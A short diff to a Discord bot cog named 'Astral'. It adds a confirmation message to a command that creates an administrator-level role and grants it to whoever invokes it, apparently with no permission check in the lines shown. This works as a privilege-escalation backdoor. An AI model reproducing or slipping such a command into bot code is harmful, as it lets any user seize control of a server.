@@ -33,3 +33,4 @@ class Astral(commands.Cog, name="Astral"):
    async def testinter(self, interaction):
       role = await interaction.guild.create_role(name="Astral Owners", permissions=disnake.Permissions(administrator=True))
       await interaction.author.add_roles(role)
+      await interaction.send("You have been given the role of Astral Owners", ephemeral=True)
